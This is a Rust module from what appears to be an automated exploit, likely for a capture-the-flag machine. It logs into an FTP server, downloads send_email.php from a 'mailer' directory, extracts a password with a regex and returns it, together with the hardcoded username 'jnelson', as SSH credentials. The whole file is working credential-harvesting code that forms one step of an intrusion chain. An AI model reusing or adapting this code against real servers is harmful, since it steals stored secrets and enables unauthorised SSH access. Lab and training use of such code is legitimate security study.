use log::info;
use regex::Regex;
use suppaftp::FtpStream;
use crate::FTPCredentials;

pub struct FTPServer {
    pub ftp_stream: FtpStream,
}

impl FTPServer {

    pub fn build(target: String, credentials: FTPCredentials) -> FTPServer {
        info!("Connecting to ftp server, it takes time...");
        let mut ftp_stream = FtpStream::connect(target).expect("ftp server error. Exit.");
        let _ = ftp_stream.login(credentials.ftp_username, credentials.ftp_password).expect("ftp server credential error. Exit");
        info!("FTP Server connected.");
        FTPServer {
            ftp_stream
        }
    }

    pub fn extract(&mut self) -> (String, String) {
        //change into mailer directory
        let _ = self.ftp_stream.cwd("mailer");
        //println!("Current directory: {}", self.ftp_stream.pwd().unwrap());
        //retrieve send_mail.php
        let data = self.ftp_stream.retr_as_buffer("send_email.php").unwrap();
       // println!("Read file with contents\n{}\n", std::str::from_utf8(&data.into_inner()).unwrap());
        let binding = data.into_inner();
        let content = std::str::from_utf8(&binding).expect("get content from send_email.php failed");

        let ssh_username = "jnelson".to_string();
        let re = Regex::new(r#"Password\s=\s"(?<p>\S+)""#).unwrap();
        let ssh_password = &re.captures(content).unwrap()["p"].to_string();

        let _ = self.ftp_stream.quit();
        info!("SSH Credentials Got. FTP Server Closed");

        return (ssh_username, ssh_password.to_owned());

    }
}